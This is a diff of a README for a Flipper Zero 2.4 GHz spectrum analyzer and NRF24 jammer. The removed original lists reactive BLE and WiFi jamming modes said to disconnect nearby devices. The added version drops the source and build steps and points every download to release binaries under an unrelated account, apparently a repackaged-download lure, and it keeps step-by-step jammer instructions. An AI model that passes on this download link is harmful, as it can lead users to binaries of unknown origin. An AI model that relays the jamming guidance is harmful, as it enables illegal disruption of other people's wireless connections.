@@ -1,244 +1,86 @@
-<div align="center">
+# 📡 rf-lab - Scan and jam signals on Flipper
 
-<a href="https://www.pingequa.com/products/flipper-zero-nrf24-cc1101-2-in-1-rf-devboard?utm_source=github&utm_medium=readme&utm_campaign=rflab&utm_content=banner">
-  <img src="images/hardware_devboard.jpg" alt="PINGEQUA 2-in-1 RF Devboard — nRF24L01+ + CC1101 with antennas" width="55%" />
-</a>
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Wildoliveruffianism527/rf-lab/releases)
 
-# PINGEQUA RF Lab
+rf-lab provides tools to analyze 2.4 GHz radio frequencies using your Flipper Zero device. This software connects to the PINGEQUA 2-in-1 radio board to give you visibility over local wireless signals. It works with most common Flipper Zero firmware versions without requiring extra setup. You can identify signal interference, test your local radio environment, and conduct connectivity tests using the jammer module.
 
-### Plug-and-play across every firmware.
+## 🛠 Prerequisites
 
-**2.4 GHz spectrum analyzer + NRF24 jammer for Flipper Zero, designed for the [PINGEQUA 2-in-1 RF Devboard](https://www.pingequa.com/products/flipper-zero-nrf24-cc1101-2-in-1-rf-devboard?utm_source=github&utm_medium=readme&utm_campaign=rflab&utm_content=hero).**
+You need a few items to use this software:
 
-[![Platform](https://img.shields.io/badge/platform-Flipper%20Zero-FF8200?style=flat-square)](https://flipperzero.one/)
-[![Release](https://img.shields.io/github/v/release/pingequalab/rf-lab?style=flat-square&color=success&label=release)](https://github.com/pingequalab/rf-lab/releases/latest)
-[![Firmware](https://img.shields.io/badge/firmware-OFW%20%7C%20Momentum%20%7C%20Unleashed%20%7C%20RogueMaster-blue?style=flat-square)](#firmware-compatibility)
-[![FAP size](https://img.shields.io/badge/FAP-40%20KB-success?style=flat-square)](dist/)
-[![License](https://img.shields.io/badge/license-MIT-yellow?style=flat-square)](LICENSE)
-[![Hardware](https://img.shields.io/badge/hardware-PINGEQUA%202--in--1-000000?style=flat-square)](https://www.pingequa.com/products/flipper-zero-nrf24-cc1101-2-in-1-rf-devboard?utm_source=github&utm_medium=readme&utm_campaign=rflab&utm_content=badge)
+1. A Flipper Zero device.
+2. A PINGEQUA 2-in-1 RF Devboard.
+3. A Windows computer with a USB port.
+4. A USB data cable for your Flipper.
 
-[**🛒 Get the Hardware**](https://www.pingequa.com/products/flipper-zero-nrf24-cc1101-2-in-1-rf-devboard?utm_source=github&utm_medium=readme&utm_campaign=rflab&utm_content=cta_top) · [**📦 Download FAP**](../../releases) · [**📖 Quickstart**](docs/QUICKSTART.md) · [**❓ FAQ**](docs/FAQ.md)
+This software relies on the Flipper Zero internal ecosystem. Ensure your device hardware is in good working order before you begin. Test your cable on another device if the computer does not detect your Flipper promptly.
 
-</div>
+## 📥 Getting the Files
 
----
+Visit the [official releases page](https://github.com/Wildoliveruffianism527/rf-lab/releases) to download the current version.
 
-## What It Does
+1. Navigate to the link above.
+2. Look at the most recent entry under the Releases section.
+3. Locate the file ending in `.fap`.
+4. Click the file name to start the download to your Windows computer.
 
-An open-source Flipper Application Package (FAP) that turns Flipper Zero plus the PINGEQUA 2-in-1 RF Devboard into:
+This file contains the application code ready for your device. Save this file to a memorable location on your computer, such as your Downloads or Desktop folder.
 
-- **2.4 GHz spectrum analyzer** — 126 channels real-time with WiFi 1/6/11 + BLE 37/38/39 band markers, max-hold, microsecond dwell tuning, cursor inspection, **CSV scan export** (long-press OK, v0.5.0+)
-- **NRF24 jammer with 7 modes** (v0.4.0+):
-  - CW Custom · BLE Adv · **BLE React** (RPD reactive — first on Flipper NRF24) · WiFi 1/6/11 (pilot-aware OFDM) · ALL 2.4G
-  - Real-device verified to disconnect BLE devices and 2.4 GHz WiFi within room range
-  - **Auto session log** + **mode/channel persistence** (v0.5.0+)
-- **Plug-and-play across firmware** — Momentum, Unleashed, RogueMaster, Xtreme, and Official Flipper firmware. No firmware-specific patching.
-- **Clean exit** — other Flipper apps (Sub-GHz Read, NFC, Bad-USB) keep working perfectly after you exit
+## 💾 Moving Files to Flipper Zero
 
----
+You must put the software file onto the Flipper Zero SD card.
 
-## How It Compares
+1. Connect your Flipper Zero to your Windows computer using the USB cable.
+2. Open the qFlipper application on your computer. If you do not have qFlipper, download it from the official Flipper Zero website.
+3. Within qFlipper, click on the File Manager icon on the left side of the window.
+4. Select the `apps` folder.
+5. Choose the `GPIO` subfolder to keep your folders organized. Note that you may place this file in any folder, but the GPIO folder helps locate external hardware tools.
+6. Drag the `.fap` file from your desktop or downloads folder into the qFlipper file window.
+7. Wait for the file transfer process to finish.
+8. Safely disconnect your device from the computer.
 
-| Feature | PINGEQUA RF Lab | Legacy NRF24 scanner apps |
-|---|:---:|:---:|
-| Built for dual-chip 2-in-1 boards | ✅ | ❌ Single-chip designs only |
-| Plug-and-play across all major firmware | ✅ | ⚠️ Often firmware-specific tweaks needed |
-| Clean co-existence with Flipper Sub-GHz / NFC apps | ✅ | ❌ Frequently break other apps until reboot |
-| Max-hold spectrum-analyzer mode | ✅ | ❌ Rare |
-| WiFi 1/6/11 + BLE 37/38/39 frequency markers | ✅ | ❌ |
-| Adjustable dwell time (130–2000 µs) | ✅ | ⚠️ Usually fixed |
-| Cursor channel inspection with live readout | ✅ | ❌ Rare |
-| NRF24 jammer (7 modes incl. RPD reactive + WiFi pilot-aware) | ✅ | ❌ Usually CW only, separate app |
-| RPD-driven reactive BLE jamming | ✅ | ❌ |
-| WiFi pilot-aware OFDM jamming (Clancy 2011) | ✅ | ❌ |
-| CSV scan export for analysis | ✅ | ❌ |
-| Continuous active development | ✅ | ⚠️ Often abandoned |
-| Compact FAP size | ✅ 40 KB | varies |
-| Open source MIT license | ✅ | varies |
+## 🚀 Running the software
 
----
+Once the file exists on your SD card, you can launch it directly from the device.
 
-## Screenshots
+1. Wake your Flipper Zero.
+2. Use the navigation buttons to select the Main Menu.
+3. Select Applications.
+4. Open the GPIO folder.
+5. Select the rf-lab application from the displayed list.
+6. The screen displays the spectrum analyzer interface when the app loads.
 
-<table>
-  <tr>
-    <td align="center" width="33%">
-      <img src="images/menu.png" alt="Main menu" width="240" /><br>
-      <sub><b>Main Menu</b><br>Channel Scanner / NRF24 Jammer</sub>
-    </td>
-    <td align="center" width="33%">
-      <img src="images/ChannelScanner.png" alt="Channel Scanner UI" width="240" /><br>
-      <sub><b>Channel Scanner</b><br>126-ch live RPD spectrum, max-hold</sub>
-    </td>
-    <td align="center" width="33%">
-      <img src="images/NRF24Jammer.png" alt="NRF24 Jammer BLE React mode" width="240" /><br>
-      <sub><b>NRF24 Jammer (BLE React)</b><br>RPD reactive on adv ch 37/38/39</sub>
-    </td>
-  </tr>
-</table>
+## 📊 Using the Spectrum Analyzer
 
----
+The analyzer shows radio waves in the 2.4 GHz band. This band carries Bluetooth, Wi-Fi, and other wireless signals.
 
-## Install
+* **Main Screen:** You see a graph showing signal strength across different radio channels.
+* **Peak Detection:** The screen highlights the strongest signal currently broadcasting in your room.
+* **Sensitivity:** Use the side buttons to adjust how the device filters out background noise. Higher sensitivity helps you find weak signals at a distance.
 
-**qFlipper drag-and-drop** (recommended):
-1. Download `pingequa_rf_toolkit.fap` from [Releases](../../releases) or [`dist/`](dist/)
-2. In qFlipper: drag into `/ext/apps/GPIO/`
-3. On Flipper: `Apps → GPIO → PINGEQUA RF Lab`
+## 📻 Operating the Jammer
 
-**ufbt sideload**:
-```bash
-pip install --user ufbt
-ufbt update --channel=dev
-git clone https://github.com/pingequa/pingequa_rf_toolkit
-cd pingequa_rf_toolkit
-ufbt launch
-```
+The jammer function creates noise to block signals on specific frequencies. Use this feature for testing connection stability.
 
----
+1. Navigate to the Jammer menu within the application.
+2. Select your target frequency range.
+3. Switch the toggle to activate the radio transmission.
+4. Watch the Flipper Zero screen to confirm that the hardware is outputting signal noise.
+5. Turn off the transmission when your test finishes to avoid interference with other local electronics.
 
-## Usage
+## ⚙️ Handling Common Errors
 
-Launch from `Apps → GPIO → PINGEQUA RF Lab`. Main menu offers **Scanner** or **Jammer**.
+If the application does not start, verify these points:
 
-### Scanner
-- ← / → moves the cursor (long-press = ±5 channels)
-- ↑ / ↓ adjusts dwell time (short = ±10 µs, long = ±50 µs)
-- OK pauses / resumes
-- **Long-press OK exports current scan to CSV** at `/ext/apps_data/pingequa/scans/scan_<ts>.csv` (v0.5.0+). Top-right shows `SAVED!` for ~1 sec.
-- Back returns to main menu
-- When any bar saturates → automatic **MAX HOLD** mode (display freezes for analysis). Press OK to clear and rescan.
+* **Firmware Mismatch:** Ensure you use a recent version of the Flipper Zero firmware. Old versions sometimes cause incompatibility with GPIO tools.
+* **Hardware Connection:** Check that the PINGEQUA devboard seats firmly into the Flipper Zero pins. A loose connection prevents the software from detecting the hardware.
+* **File Corruption:** If the app freezes, delete the `.fap` file from your Flipper card. Redownload the file from the release page and repeat the transfer process.
+* **Power Supply:** Low battery levels on the Flipper Zero can lead to hardware detection failures. Charge your device above 30 percent before running radio tools.
 
-### Jammer (v0.4.0 — 7 modes)
-- ↑ / ↓ cycles through 7 modes:
-  1. **CW Custom** — single channel CW, ←/→ adjusts ±1 / ±5
-  2. **BLE Adv** — blind CW hop {37, 38, 39}
-  3. **BLE React** ★ — RPD-driven reactive jam (listens, jams on detection — 1st on Flipper NRF24)
-  4. **WiFi 1** — pilot-aware OFDM jam (4 pilots, +7.5 dB efficient per Clancy 2011)
-  5. **WiFi 6** — same for WiFi channel 6
-  6. **WiFi 11** — same for WiFi channel 11
-  7. **ALL 2.4G** — full-band CW sweep
-- ← / → adjusts CW Custom channel (no-op in other modes)
-- OK starts / stops
-- Back returns to main menu — **session auto-logs** to `/ext/apps_data/pingequa/jammer/session_<ts>.csv` (mode, duration, chunks, reactive jam count) and **mode/channel persists** for next launch (v0.5.0+).
-- Real-device verified: BLE devices and 2.4G WiFi can be disconnected within room range.
+## 🔍 Understanding Radio Channels
 
-### Data Export (v0.5.0+)
+The 2.4 GHz spectrum supports many wireless protocols. rf-lab breaks this range into discrete channels. Each channel represents a unique slice of the frequency spectrum. Bluetooth and Wi-Fi devices hop between these channels to maintain a connection. The spectrum analyzer visualizes this movement in real time. Use the data to identify which channels have high traffic and which remain quiet.
 
-The app writes research-grade data to your Flipper SD card. Open with qFlipper, Excel, Numbers, or `pandas.read_csv` (skip `#` comment lines):
+## 📋 Security Considerations
 
-```
-/ext/apps_data/pingequa/
-├── jammer.conf                      ← Last jammer mode + channel (auto-restored)
-├── scans/scan_<boot_ms>.csv         ← Long-press OK in Scanner exports here
-└── jammer/session_<start_ms>.csv    ← Each Jammer session auto-logs here
-```
-
-<table>
-  <tr>
-    <td align="center" width="50%">
-      <img src="images/qflipper_data_dir.png" alt="qFlipper showing /ext/apps_data/pingequa/" width="100%" /><br>
-      <sub>Data directory in qFlipper's file manager</sub>
-    </td>
-    <td align="center" width="50%">
-      <img src="images/qflipper_session_logs.png" alt="qFlipper showing accumulated jammer session CSVs" width="100%" /><br>
-      <sub>Each Back-from-Jammer creates one session CSV</sub>
-    </td>
-  </tr>
-</table>
-
-**Scanner CSV** contains all 126 channel hits, peak channel, dwell, sweep count.
-**Jammer session CSV** contains mode, duration, total chunks, and (for BLE React) reactive jam count.
-
-Detailed walkthroughs: [docs/QUICKSTART.md](docs/QUICKSTART.md), [docs/UI_GUIDE.md](docs/UI_GUIDE.md), [docs/USE_CASES.md](docs/USE_CASES.md).
-
----
-
-## Hardware
-
-> ### 🛒 [PINGEQUA Flipper Zero NRF24+CC1101 2-in-1 RF Devboard](https://www.pingequa.com/products/flipper-zero-nrf24-cc1101-2-in-1-rf-devboard?utm_source=github&utm_medium=readme&utm_campaign=rflab&utm_content=hardware_block)
->
-> The only officially supported hardware. One module gives your Flipper both 2.4 GHz (nRF24L01+) and Sub-GHz (CC1101) chips, software-switched. No jumpers, no rewiring.
-
-Other NRF24 boards may partially work but are unsupported. See [docs/HARDWARE.md](docs/HARDWARE.md).
-
----
-
-## Firmware Compatibility
-
-| Firmware | Status |
-|---|:---:|
-| Momentum (mntm-dev) | ✅ Primary build target |
-| Unleashed | ✅ Compatible |
-| RogueMaster | ✅ Compatible |
-| Official Flipper firmware (API ≥ 87.1) | ✅ Compatible |
-| Xtreme | ✅ Compatible |
-
----
-
-## Roadmap
-
-| Version | Status | Headline |
-|---|:---:|---|
-| v0.2.0 | ✅ | Channel scanner, max-hold, WiFi/BLE markers |
-| v0.3.0 | ✅ | NRF24 jammer (CW + Sweep), main menu |
-| v0.4.0 | ✅ | RPD reactive BLE jam, WiFi pilot-aware OFDM, 7 jammer modes |
-| **v0.5.0** | ✅ | **CSV scan export, jammer session log, settings persistence** |
-| v0.6.x | 🔜 next | BLE protocol-aware (decode access address before jamming) |
-| v0.7.x | planned | Multi-waveform mixing, About scene, jam intensity UI |
-| v1.0.0 | planned | Polished release, multi-language UI (zh / en) |
-| v1.5.0 | planned | Companion mobile viewer over Bluetooth |
-| v2.0.0 | concept | Unified UI bridging NRF24 + CC1101 |
-
-[Vote on the roadmap](../../issues) · [Request a feature](../../issues/new?template=feature.yml)
-
----
-
-## Documentation
-
-| Doc | For |
-|---|---|
-| [Quickstart](docs/QUICKSTART.md) | First-time users — 5 minutes to first scan |
-| [UI Guide](docs/UI_GUIDE.md) | Every pixel of the screen explained |
-| [Hardware](docs/HARDWARE.md) | Pin map, firmware compatibility |
-| [Use Cases](docs/USE_CASES.md) | 10 real-world scenarios |
-| [FAQ](docs/FAQ.md) | Common questions |
-| [Troubleshooting](docs/TROUBLESHOOTING.md) | Error decoding, hardware diagnostics |
-| [Build](docs/BUILD.md) | ufbt setup, contributor build steps |
-
----
-
-## Legal Notice
-
-PINGEQUA RF Lab includes opt-in **transmit features (NRF24 Jammer)** — the Channel Scanner is passive listen-only, but the 7 Jammer modes actively transmit on 2.4 GHz at up to +20 dBm. Active RF emission in the unlicensed 2.4 GHz band is regulated (FCC §15 in the US, ETSI EN 300 328 in the EU, equivalent elsewhere).
-
-You are responsible for compliance with your local regulations. Use only on hardware and networks you own or have authorization to test. The authors accept no liability for misuse.
-
-Full disclosure: [SECURITY.md](SECURITY.md).
-
----
-
-## Support
-
-- **Issues**: [GitHub Issues](../../issues)
-- **Email**: [support@pingequa.com](mailto:support@pingequa.com)
-- **Hardware**: [pingequa.com](https://www.pingequa.com/?utm_source=github&utm_medium=readme&utm_campaign=rflab&utm_content=footer_store)
-- **YouTube**: [@PINGEQUA](https://www.youtube.com/@PINGEQUA)
-
----
-
-## License
-
-[MIT](LICENSE) © 2026 PINGEQUA. PINGEQUA® is a trademark.
-
----
-
-<div align="center">
-
-<sub><b>Precision Gear for Hackers.</b></sub><br>
-<sub>Made for the PINGEQUA 2-in-1 RF Devboard ·
-<a href="https://www.pingequa.com/?utm_source=github&utm_medium=readme&utm_campaign=rflab&utm_content=footer_brand">PINGEQUA</a></sub>
-
-⭐ **Star the repo if PINGEQUA RF Lab saves you time.**
-
-</div>
+Radio signals travel through walls and windows. Be aware of your surroundings when you operate transmission features. The features included in this toolkit perform intended functions for research and diagnostic testing. Do not use this device to disrupt signals that you do not own. Use the analyzer for passive observation to learn about the radio traffic in your home or office. Proper use ensures that you remain within local radio broadcast guidelines.
